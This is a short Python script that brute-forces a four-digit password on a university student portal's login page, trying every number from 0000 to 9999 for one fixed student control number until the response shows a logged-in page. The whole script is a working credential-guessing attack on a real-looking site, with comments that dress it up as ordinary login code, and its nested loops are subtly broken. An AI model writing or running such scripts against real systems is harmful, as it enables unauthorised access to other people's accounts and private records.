import requests
# Define the URL of the login page
login_url = "https://sii.itq.edu.mx/sistema/index.php"
for number in range(1000):
    for number in range(10000):
        # Format the number with leading zeros to make it 4 digits
                    formatted_number = f'{number:04}'
                    print(f'Trying password: {formatted_number}')             
                    # Create a session to persist cookies
                    session = requests.Session()

                    # Prepare the data for the POST request
                    data = {
                        "no_de_control": "20140881",  # Replace with your actual control number
                        "password": formatted_number,  # Replace with your actual password
                    }

                    # Send a POST request to the login page
                    response = session.post(login_url, data=data)
                    if "modulos/alu/" in response.text:
                        print("Login successful!")
                        break
                    session.close()
